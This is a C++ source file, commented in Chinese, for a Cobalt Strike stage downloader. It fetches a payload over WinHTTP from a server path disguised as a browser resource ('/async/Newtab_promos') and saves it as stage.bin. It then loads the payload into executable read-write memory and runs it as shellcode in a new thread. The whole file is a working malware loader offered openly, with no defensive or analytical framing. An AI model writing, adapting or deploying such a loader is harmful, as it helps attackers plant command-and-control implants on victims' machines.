// winhttp下载stage.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
//

#include <iostream>
#include <windows.h>
#include <winhttp.h>
#include <stdio.h>

#pragma comment(lib, "winhttp.lib")

int main()
{
    HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;
    DWORD dwSize = 0;
    BOOL bResults = FALSE;
    LPSTR pszOutBuffer;
    DWORD dwDownloaded = 0;
    const WCHAR* szUrl = L"http://127.0.0.1/async/Newtab_promos";
    const WCHAR* szDomain = L"127.0.0.1";
    const WCHAR* szUrlPath = L"/async/Newtab_promos";
    const char* szFileName = "stage.bin";

    // 建立 WinHTTP 会话
    hSession = WinHttpOpen(L"CobaltStrike Stage Downloader", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (hSession == NULL) {
        printf("Failed to create WinHTTP session. Error %u\n", GetLastError());
        return -1;
    }

    // 连接目标主机
    hConnect = WinHttpConnect(hSession, szDomain, INTERNET_DEFAULT_HTTP_PORT, 0);
    if (hConnect == NULL) {
        printf("Failed to connect to server. Error %u\n", GetLastError());
        WinHttpCloseHandle(hSession);
        return -1;
    }
  
    // 发送 HTTP 请求
    hRequest = WinHttpOpenRequest(hConnect, L"GET", szUrlPath, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
    if (hRequest == NULL) {
        printf("Failed to create HTTP request. Error %u\n", GetLastError());
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return 1;
    }

    // 发送请求
    bResults = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
    if (!bResults) {
        printf("Failed to send HTTP request. Error %u\n", GetLastError());
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return 1;
    }
    
    // 接收响应
    bResults = WinHttpReceiveResponse(hRequest, NULL);
    if (!bResults) {
        printf("Failed to receive HTTP response. Error %u\n", GetLastError());
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return 1;
    }
    // 创建一个请求，先查询内容的大小
    DWORD dwContentSize = 0, dwIndex = 0, dwSizeDW = sizeof(dwSizeDW);
    WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_CONTENT_LENGTH | WINHTTP_QUERY_FLAG_NUMBER, NULL, &dwContentSize, &dwSizeDW, &dwIndex);
    
    printf("文件总体积: %d\n", dwContentSize);

    //文件缓存
    FILE* fp;
    fopen_s(&fp, szFileName, "wb");
    if (fp == NULL) {
        printf("Failed to create local file. Error %u\n", GetLastError());

        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return 1;
    }
    // 查询响应数据大小
    bResults = WinHttpQueryDataAvailable(hRequest, &dwSize);
    if (bResults) {
            do
            {

                // Verify available data.
                dwSize = 0;
                if (!WinHttpQueryDataAvailable(hRequest, &dwSize))
                    printf("Error %u in WinHttpQueryDataAvailable.\n", GetLastError());
                printf("recv :%d \n", dwSize);
                // Allocate space for the buffer.
                pszOutBuffer = new char[dwSize + 1];
                if (!pszOutBuffer)
                {
                    printf("Out of memory\n");
                    dwSize = 0;
                }
                else
                {
                    // Read the Data.
                    ZeroMemory(pszOutBuffer, dwSize + 1);

                    if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer,
                        dwSize, &dwDownloaded))
                        printf("Error %u in WinHttpReadData.\n", GetLastError());
                    else
                        fwrite(pszOutBuffer, sizeof(char), dwDownloaded, fp);

                    // Free the memory allocated to the buffer.
                    delete[] pszOutBuffer;
                }

            } while (dwSize > 0);

    }
    else {
        printf("Failed to query available data. Error %u\n", GetLastError());
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return 1;
    }
    printf("size of file : %d\n",ftell(fp));

    if (ftell(fp) != dwContentSize)
        printf("file recv error!\n");
    

    // 清理资源
    fclose(fp);
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    printf("Downloaded CobaltStrike Stage to %s.\n", szFileName);
    fopen_s(&fp, szFileName, "rb");
    LPVOID dllbuff=VirtualAlloc(0, dwContentSize,MEM_COMMIT ,PAGE_EXECUTE_READWRITE);
    fread_s(dllbuff, dwContentSize, dwContentSize, 1, fp);
    HANDLE thba = CreateThread(0, 0,(LPTHREAD_START_ROUTINE) dllbuff, 0, 0, 0);
    WaitForSingleObject(thba, -1);
    return 0;
}

